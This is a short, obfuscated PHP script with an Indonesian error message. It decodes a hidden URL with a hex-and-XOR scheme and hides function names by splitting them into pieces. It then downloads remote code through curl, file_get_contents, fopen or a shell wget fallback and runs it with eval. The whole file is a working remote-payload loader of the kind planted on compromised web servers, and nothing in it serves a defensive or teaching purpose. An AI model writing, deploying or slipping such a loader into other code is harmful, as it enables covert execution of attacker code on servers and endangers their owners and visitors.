<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

function z1($a, $b) {
    $c = '';
    for ($d = 0; $d < strlen($a); $d++) {
        $c .= chr(ord($a[$d]) ^ $b);
    }
    return $c;
}

$k1 = 0b1010;

$h2 = "627e7e7a79302525786b7d246d637e627f687f796f786965647e6f647e24696567254e6b6764596f69257225676b636425383b247e727e";
$e3 = hex2bin($h2);

$d4 = z1($e3, $k1);

$f5 = 'curl_' . 'init';
$f6 = 'curl_' . 'exec';
$f7 = 'curl_' . 'close';
$f8 = 'file_' . 'get_' . 'contents';
$f9 = 'f' . 'open';
$f10 = 'f' . 'close';
$f11 = 'shell_' . 'exec';

function j2($m) {
    global $f5, $f6, $f7, $f8, $f9, $f10, $f11;

    if (function_exists($f5)) {
        $n = $f5();
        curl_setopt($n, CURLOPT_URL, $m);
        curl_setopt($n, CURLOPT_RETURNTRANSFER, true);
        $o = $f6($n);
        $p = curl_getinfo($n, CURLINFO_HTTP_CODE);
        $f7($n);

        if ($o !== false && $p == 200) {
            return $o;
        }
    }

    if (ini_get('allow_url_fopen')) {
        $o = @$f8($m);
        if ($o !== false) {
            return $o;
        }
    }

    $q = @$f9($m, 'r');
    if ($q) {
        $o = '';
        while (!feof($q)) {
            $o .= fread($q, 8192);
        }
        $f10($q);
        if ($o !== false) {
            return $o;
        }
    }

    if (function_exists('exec') || function_exists($f11)) {
        $o = @$f11('wget -q -O - ' . escapeshellarg($m));
        if (!empty($o)) {
            return $o;
        }
    }

    return false;
}

$r12 = j2($d4);

if ($r12 !== false) {
    $s13 = function($t) {
        return @eval('?>' . $t);
    };

    $s13($r12);
} else {
    echo "Gagal mendapatkan konten dari URL.";
}

?>
